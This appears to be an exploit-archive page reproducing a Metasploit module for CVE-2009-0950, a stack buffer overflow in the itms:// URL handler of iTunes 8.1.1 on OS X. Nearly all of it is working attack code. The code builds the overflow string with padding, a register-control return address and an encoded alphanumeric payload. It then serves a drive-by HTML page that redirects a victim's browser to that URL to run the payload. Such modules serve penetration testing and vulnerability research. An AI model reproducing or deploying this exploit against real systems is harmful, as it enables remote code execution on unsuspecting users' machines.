<html><head><title>Apple iTunes 8.1.1 (ITMS) Multiple Protocol Handler BOF Exploit (meta)</title></head><pre>##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'


class Metasploit3 &lt; Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           =&gt; 'Apple OS X iTunes 8.1.1 ITMS Overflow',
			'Description'    =&gt; %q{
				This modules exploits a stack-based buffer overflow in iTunes
				itms:// URL parsing.   It is accessible from the browser and
				in Safari, itms urls will be opened in iTunes automatically.
				Because iTunes is multithreaded, only vfork-based payloads should
				be used.
			},
			'Author'         =&gt; [ 'Will Drewry &lt;redpig@dataspill.org&gt;' ],
			'License'        =&gt; MSF_LICENSE,
			'Version'        =&gt; '$Revision:  $',
			'References'     =&gt;
				[
					['CVE', 'CVE-2009-0950'],
					['URL', 'http://support.apple.com/kb/HT3592'],
					['URL', 'http://redpig.dataspill.org/2009/05/drive-by-attack-for-itunes-811.html'],
				],
			'Payload'        =&gt;
				{
					'Space'       =&gt; 1024,  # rough estimate of what browsers will pass.
					'DisableNops' =&gt; true,  # don't pad out the space.
					'BadChars' =&gt; '',
					# The encoder must be URL-safe otherwise it will be automatically
					# URL encoded.
					'EncoderType'   =&gt; Msf::Encoder::Type::AlphanumMixed,
					'EncoderOptions' =&gt;
						{
							'BufferRegister' =&gt; 'ECX',  # See the comments below
							'BufferOffset' =&gt; 3,  # See the comments below
						},
				},
			'Targets'	=&gt;
				[
					[
						'OS X',
						{
							'Platform'      =&gt; [ 'osx' ],
							'Arch'          =&gt; ARCH_X86,
							'Addr'          =&gt; 'ATe'
						},
					 ],
					[
						'Windows (not done yet)',
						{
							'Platform'      =&gt; [ 'win' ],
							'Arch'          =&gt; ARCH_X86,
							'Addr'          =&gt; 'CCCC'
						},
					 ],
				],
			'DisclosureDate' =&gt; 'June 1, 2009',
			'DefaultTarget'  =&gt; 0))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, &quot;The local port to listen on.&quot;, 80 ]),
				OptString.new('URIPATH', [ true, &quot;The URI to use for this exploit.&quot;, &quot;/&quot; ])
			], self.class)
	end

	# Generate distribution script, which calls our payload using JavaScript.
	def generate_itms_page(p)
		# Set the base itms url.
		# itms:// or itmss:// can be used.  The trailing colon is used
		# to start the attack.  All data after the colon is copied to the
		# stack buffer.
		itms_base_url = &quot;itms://:&quot;
		itms_base_url &lt;&lt; &quot;A&quot;*268  # Fill up the real buffer
		itms_base_url &lt;&lt; &quot;XXXXAAAAZZZZYYYY&quot;  # $ebx, $esi, $edi, $ebp
		itms_base_url &lt;&lt; target['Addr']  # hullo there, jmp *%ecx!
		# The first '/' in the buffer will terminate the copy to the stack buffer.
		# In addition, $ecx will be left pointing to the last 6 bytes of the heap
		# buffer containing the full URL.  However, if a colon and a ? occur after
		# the value in ecx will point to that point in the heap buffer.  In our
		# case, it will point to the beginning.  The ! is there to make the
		# alphanumeric shellcode execute easily.  (This is why we need an offset
		# of 3 in the payload).
		itms_base_url &lt;&lt; &quot;/:!?&quot;   # Truncate the stack overflow and prep for payload
		itms_base_url &lt;&lt; p # Wooooooo! Payload time.
		# We drop on a few extra bytes as the last few bytes can sometimes be
		# corrupted.
		itms_base_url &lt;&lt; &quot;AAAA&quot;

		# Use the pattern creator to simplify exploit creation :)
		# itms_base_url &lt;&lt; Rex::Text.pattern_create(1024,
		#                                           Rex::Text::DefaultPatternSets)

		# Return back an example URL.  Using an iframe doesn't work with all
		# browsers, but that's easy enough to fix if you need to.
		return String(&lt;&lt;-EOS)
		&lt;html&gt;&lt;head&gt;&lt;title&gt;iTunes loading . . .&lt;/title&gt;&lt;/head&gt;
		  &lt;body&gt;
		    &lt;script&gt;document.location.assign(&quot;#{itms_base_url}&quot;);&lt;/script&gt;
		    &lt;p&gt;iTunes should open automatically, but if it doesn't, click to
		      &lt;a href=&quot;#{itms_base_url}&quot;&gt;continue&lt;/a&gt;.&lt;/p&gt;
		  &lt;/body&gt;
		&lt;/html&gt;
		EOS
	end

	def on_request_uri(cli, request)
		print_status(&quot;Generating payload...&quot;)
		return unless (p = regenerate_payload(cli))
		#print_status(&quot;=&gt; #{payload.encoded}&quot;)
		print_status(&quot;=&gt; #{payload.encoded.length} bytes&quot;)

		print_status(&quot;Generating HTML container...&quot;)
		page = generate_itms_page(payload.encoded)
		#print_status(&quot;=&gt; #{page}&quot;)
		print_status(&quot;Sending itms page to #{cli.peerhost}:#{cli.peerport}&quot;)

		header = { 'Content-Type' =&gt; 'text/html' }
		send_response_html(cli, page, header)
		handler(cli)
	end

end

# milw0rm.com [2009-06-03]</pre></html>